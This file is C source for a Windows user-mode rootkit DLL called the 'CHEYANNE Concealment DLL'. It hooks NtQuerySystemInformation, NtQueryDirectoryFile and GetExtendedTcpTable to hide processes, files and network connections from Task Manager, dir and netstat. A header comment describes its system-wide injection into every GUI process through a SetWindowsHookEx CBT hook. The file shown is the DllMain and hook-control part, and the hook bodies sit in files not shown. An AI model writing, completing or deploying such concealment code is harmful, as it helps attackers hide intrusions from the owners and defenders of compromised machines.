/*
 * cloak.c — CHEYANNE Concealment DLL
 * 22DIV / george wu
 *
 * User-mode rootkit DLL. On DLL_PROCESS_ATTACH, installs inline hooks
 * on NtQuerySystemInformation, NtQueryDirectoryFile, and GetExtendedTcpTable.
 * Hidden processes vanish from Task Manager, hidden files vanish from dir,
 * hidden connections vanish from netstat.
 *
 * Delivery: SetWindowsHookEx (WH_CBT, system-wide) via cloak_loader.exe.
 * Windows loads this DLL into every GUI process automatically.
 *
 * Exports CloakHookProc for the SetWindowsHookEx callback.
 */

#include <windows.h>
#include "hook_engine.h"

extern BOOL install_process_hook(void);
extern void remove_process_hook(void);
extern BOOL install_file_hook(void);
extern void remove_file_hook(void);
extern BOOL install_connection_hook(void);
extern void remove_connection_hook(void);

static BOOL g_hooked = FALSE;
static HHOOK g_cbt_hook = NULL;

static void install_all_hooks(void) {
    if (g_hooked) return;
    install_process_hook();
    install_file_hook();
    install_connection_hook();
    g_hooked = TRUE;
}

static void remove_all_hooks(void) {
    if (!g_hooked) return;
    remove_process_hook();
    remove_file_hook();
    remove_connection_hook();
    g_hooked = FALSE;
}

__declspec(dllexport) LRESULT CALLBACK CloakHookProc(
    int    nCode,
    WPARAM wParam,
    LPARAM lParam
) {
    return CallNextHookEx(g_cbt_hook, nCode, wParam, lParam);
}

__declspec(dllexport) void SetCBTHook(HHOOK hook) {
    g_cbt_hook = hook;
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    (void)hDll; (void)reserved;

    switch (reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hDll);
            install_all_hooks();
            break;
        case DLL_PROCESS_DETACH:
            remove_all_hooks();
            break;
    }
    return TRUE;
}
